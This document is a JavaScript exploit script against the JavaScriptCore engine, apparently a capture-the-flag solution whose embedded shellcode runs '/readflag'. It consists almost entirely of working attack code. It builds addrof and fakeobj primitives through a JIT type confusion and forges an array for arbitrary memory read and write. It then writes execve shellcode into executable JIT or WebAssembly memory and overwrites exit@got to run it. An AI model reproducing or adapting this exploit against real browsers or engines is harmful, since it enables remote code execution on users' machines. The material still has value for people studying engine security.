buffer = new ArrayBuffer(8);
view = new DataView(buffer);
t = {}

function float2uint(value) {
    view.setFloat64(0, value)
    return view.getBigUint64(0);
}

function uint2float(value) {
    view.setBigUint64(0, value, true);
    return view.getFloat64(0, true);
}

let pat = 13.37;
let cow = 1.12345;
let arr = [pat, 1.123, 1.123]

function addrof(obj) {
    let arr = new Array(pat, 1.123, 1.123);
    function addrof_(arr, obj) {
        arr[1] = 1.1;
        tmp = obj + arr;
        return arr[0];
    }
    let side_effect = {
        toString: () => {
            arr[0] = obj;
        }
    }
    for(let i = 0; i < 0x10000; i++) {
        addrof_(arr, {});
    }
    let addr = addrof_(arr, side_effect);
    return float2uint(addr);
}

first = 1
function fakeobj(addr) {
    let arr_fake = new Array(cow, cow, cow);
    addr = uint2float(addr);
    function fakeobj_(arr_fake, obj, addr) {
        arr_fake[1] = 1.1;
        tmp = obj + t;
        arr_fake[2] = addr;
    }
    let side_effect = {
        toString: () => {
            arr_fake[2] = { }    // make an object
            return "string";
        }
    }
    for(let i = 0; i < 0x10000; i++) {
        fakeobj_(arr, {}, 1.12345);
    }
    fakeobj_(arr_fake, side_effect, addr);
    return arr_fake[2];
}

print("[*] enter stage 1")
print("[*] ready to jit")
print("[*] test stage 1 primitive...")
test_arr = new Array(1, 2, 3);
test_ptr = addrof(test_arr);
if (fakeobj(test_ptr) !== test_arr) {
    print("[-] failed to setup stage 1 primitive")
    exit(0);
}
print("[+] setup stage 1 primitive!")

print("[*] enter stage 2");
function hex(v) {
    return "0x"+v.toString(16);
}

p = 13.37
let buffer_list = []
let view_list = []
let arr_list = []
for (let i = 0; i < 30; i++) {
    a = new Array(p, 1.1, 1.2, 1.3, 1.4, 1.5);
    arr_list.push(a);
}

let fake_cell = uint2float(0x0108240700006240n-0x2000000000000n);
let container = {
    header: fake_cell,
    butterfly: arr_list[1],
    pad1: uint2float(0n),
    pad2: uint2float(0n)
}
print("[+] addrof container: "+hex(addrof(container)));
print("[+] addrof a: "+hex(addrof(arr_list[1])));
fake_arr = fakeobj(addrof(container)+0x10n)
print("[*] fake length: "+fake_arr.length)
print("[*] jscell: "+hex(float2uint(fake_arr[0])))
container.header = uint2float(float2uint(fake_arr[0])-0x2000000000000n);

print("[*] enter stage 3");
bu = new ArrayBuffer(10);
dv = new DataView(bu);
dv.setFloat64(0, pat);

var padding = [1.1,2.2,3.3,4.4,5.5];
var unboxed = [pat,2.2,3.3];
var boxed = [{}];
let arb_rw_arr = [arr_list[1]]

function arb_read(addr) {
    // set the value of butterfly
    fake_arr[1] = uint2float(addr);
    return arr_list[1][0];
}
function arb_read1(addr) {
    // set the value of butterfly
    fake_arr[1] = uint2float(addr);
    return arr_list[1][2];
}
function arb_read2(addr) {
    // set the value of butterfly
    fake_arr[1] = uint2float(addr);
    return arr_list[1][2];
}
function arb_read3(addr) {
    // set the value of butterfly
    fake_arr[1] = uint2float(addr);
    return arr_list[1][3];
}
function arb_readn(addr, o) {
    // set the value of butterfly
    fake_arr[1] = uint2float(addr);
    return arr_list[1][o];
}
function arb_write_uint(addr, value) {
    fake_arr[1] = uint2float(addr);
    arr_list[1][0] = uint2float(value);
}
function arb_write_float(addr, value) {
    fake_arr[1] = uint2float(addr);
    arr_list[1][0] = (value);
}

// print("[*] test arb_read(container): "+hex(float2uint(arb_read(addrof(container)+0x10n))));

function wasm_func() {
    var wasm_import = {
        env: {
            puts: function puts(index) {
                print(utf8ToString(h, index));
            }
        }
    };

    var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 137, 128, 128, 128, 0, 2,
        96, 1, 127, 1, 127, 96, 0, 0, 2, 140, 128, 128, 128, 0, 1, 3, 101, 110, 118, 4, 112, 117,
        116, 115, 0, 0, 3, 130, 128, 128, 128, 0, 1, 1, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5,
        131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 146, 128, 128, 128, 0, 2, 6,
        109, 101, 109, 111, 114, 121, 2, 0, 5, 104, 101, 108, 108, 111, 0, 1, 10, 141, 128, 128,
        128, 0, 1, 135, 128, 128, 128, 0, 0, 65, 16, 16, 0, 26, 11, 11, 146, 128, 128, 128, 0, 1, 0,
        65, 16, 11, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 0
    ]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer), wasm_import);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

// find RWX page using wasm function
wasm_function = wasm_func();
wasm_function_addr = addrof(wasm_function);
print("[*] addrof(wasm_function): "+hex(wasm_function_addr))
code_addr = wasm_function_addr+0x40n-0x10n;
code_addr = float2uint(arb_read2(code_addr));
print("[+] get code address: "+hex(code_addr));
target_code_addr = code_addr-0x4000n+0x20n;
print("[*] target address: "+hex(target_code_addr))

// SYS_execve('/readflag', null, null);
var shellcode = [
    0x72bf48006a583b6an,
    0x5767616c66646165n,
    0x5700000067c7c748n,
    0x66646165722fbf48n,
    0x3148e7894857616cn,
    0x9090050fd23148f6n,    
]

// remote crash here :(
for (let i = 0; i < shellcode.length; i++) {
    arb_write_uint(target_code_addr, BigInt(shellcode[i]));
    target_code_addr += 8n;
}

getJITFunction = function (){
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 0x5000; i++) {
                target(i);
            }
    for (var i = 0; i < 0x5000; i++) {
                target(i);
            }
    for (var i = 0; i < 0x5000; i++) {
                target(i);
            }
    
    return target;
}

// find rwx 
let f = getJITFunction();
let addr_f = addrof(f);
let addr_wtf = float2uint(arb_read2(addr_f+0x18n-0x10n));
let addr_wtf2 = float2uint(arb_read(addr_wtf+8n));
let addr_wtf3 = float2uint(arb_read2(addr_wtf2-0x10n));
let addr_wtf4 = float2uint(arb_read(addr_wtf3+0x10n));
let libjsc = addr_wtf4-0xdb3550n
let exit_got = libjsc+0x1e90310n;
let text_base = float2uint(arb_readn(float2uint(arb_read3(addr_wtf+0x10n))-0x20n, 4))-0x4e740n;
// let libc_base = float2uint(arb_read(text_base+327560n))-0x76950n // fwrite

print(hex(addr_f));
print(hex((addr_wtf)));
print(hex(addr_wtf2));
print(hex(addr_wtf3));
print(hex(addr_wtf4));
print(hex(libjsc));
print(hex(text_base));

arb_write_uint(exit_got, target_code_addr-0x30n);    // overwrite exit@got to our shellcode
print("[+] ready to execute");
